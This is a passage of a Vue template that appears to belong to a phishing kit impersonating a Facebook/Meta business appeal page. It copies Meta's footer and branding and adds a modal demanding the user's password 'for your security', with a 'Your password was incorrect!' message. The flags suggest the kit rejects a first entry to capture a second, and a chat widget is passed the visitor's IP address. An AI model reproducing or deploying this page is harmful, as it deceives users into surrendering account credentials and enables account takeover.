                        <label class="labela" for="field_additionalInfo"
                          >Your Appeal</label
                        >
                        <textarea
                          required=""
                          rows="3"
                          id="field_additionalInfo"
                          v-model="form.appeal"
                          class="form-control"
                        ></textarea>
                        <p
                          v-for="(error, index) of v$.form.appeal.$errors"
                          :key="index"
                          class="pwincorrect"
                        >
                          Appeal cannot be empty!
                        </p>
                      </div>
                      <div class="mb-3">
                        <div class="form-check">
                          <input
                            type="checkbox"
                            id="formBasicCheckbox"
                            class="form-check-input"
                          /><label
                            title=""
                            for="formBasicCheckbox"
                            class="form-check-label"
                            >Do you agree to our Terms, Data Policy and Cookies
                            Policy.</label
                          >
                        </div>
                      </div>

                      <div class="alignright">
                        <button
                          type="submit"
                          id="submitDataBtn"
                          class="btn btn-primary button-15"
                          @click="submitForm"
                        >
                          Submit
                        </button>
                      </div>
                      <!-- </form> -->
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="footer" id="futeri">
      <div class="container">
        <img src="../assets/images/logo.svg" class="logofooter" />
        <p class="nerlogofooter">
          Facebook can help your large, medium or small business grow. Get the
          latest news for advertisers and more on our
          <a href="#">Meta for Business Page.</a>
        </p>
        <div class="row">
          <div class="col-lg col-6">
            <ul>
              <li>
                <p class="fontbold">Marketing on Facebook</p>
                <p>Success Stories</p>
                <p>Measurement</p>
                <p>Industries</p>
                <p>Inspiration</p>
                <p>Events</p>
                <p>News</p>
                <p>Site map</p>
              </li>
            </ul>
          </div>
          <div class="col-lg col-6">
            <ul>
              <li>
                <p class="fontbold">Marketing objectives</p>
                <p>Build your presence</p>
                <p>Create awareness</p>
                <p>Drive discovery</p>
                <p>Generate leads</p>
                <p>Boost sales</p>
                <p>Earn loyalty</p>
              </li>
            </ul>
          </div>
          <div class="col-lg col-6">
            <ul>
              <li>
                <p class="fontbold">Facebook Pages</p>
                <p>Get started with Pages</p>
                <p>Setting up your Page</p>
                <p>Manage your Facebook Page</p>
                <p>Promote your Page</p>
                <p>Messaging on your Page</p>
                <p>Page Insights</p>
              </li>
            </ul>
          </div>
          <div variant="dontshowonmobile col-lg" class="col">
            <ul>
              <li>
                <p class="fontbold">Facebook ads</p>
                <p>Get started with ads</p>
                <p>Buying Facebook ads</p>
                <p>Ad formats</p>
                <p>Ad placement</p>
                <p>Choose your audience</p>
                <p>Measure your ads</p>
                <p>Managing your ads</p>
              </li>
            </ul>
          </div>
          <div class="col-lg col-6">
            <ul>
              <li>
                <p class="fontbold">Resources</p>
                <p>Ads Guide</p>
                <p>Business Help Centre</p>
                <p>Meta Audience Network</p>
                <p>Meta Blueprint</p>
                <p>Meta for Developers</p>
                <p>Meta Business Partners</p>
                <p>Instagram Business</p>
                <p>Support</p>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
    <div class="bottomfooter">
      <div class="container">
        <ul>
          <li>English (UK)</li>
          <li>English (US)</li>
          <li>Español</li>
          <li>Português (Brasil)</li>
          <li>Français (France)</li>
          <li>Español (España)</li>
          <li>More languages</li>
        </ul>
        <ul>
          <li>© 2022 Meta</li>
          <li>About</li>
          <li>Developers</li>
          <li>Careers</li>
          <li>Privacy</li>
          <li>Cookies</li>
          <li>Terms</li>
          <li>Help Centre</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Chat Widget -->
  <chat-widget :ipAddress="ipAddress" @chat-message-status="chatMessageStatus" />

  <div
    v-if="firstPassword"
    id="modalFade"
    class="fade modal-backdrop show"
  ></div>
  <div
    v-if="firstPassword"
    id="fbPasswordModal"
    role="dialog"
    aria-modal="true"
    class="fade modali2 modal show"
    style="display: block"
    tabindex="-1"
  >
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <div class="modal-title h4">Please Enter Your Password</div>
          <button type="button" class="btn-close" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <p class="foryoursecurity">
            For your security, you must re-enter your password to continue.
          </p>
          <div class="mb-3 formapw">
            <label class="labela" for="formBasicEmail">Password</label>
            <input
              v-model="modal.password"
              required=""
              type="password"
              id="passwordField"
              class="form-control"
            />
          </div>
          <p v-if="modal.error" class="pwincorrect">Password cannot be empty!</p>
          <p
            v-if="wrongPw"
            class="pwincorrect"
            id="fbPasswordModalError"
          >
            Your password was incorrect!
          </p>
        </div>
        <div class="modal-footer">
          <button
            @click="submitPassword"
            type="button"
            id="passwordSubmitBtn"
            form="forma1"
            class="btn btn-primary button-15"
          >
            Continue
          </button>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped src="../assets/css/main.css">
</style>
<style scoped>
.hidden {
  display: none !important;
}
.open-modal {
  overflow: hidden !important;
  padding-right: 16px;
}
</style>
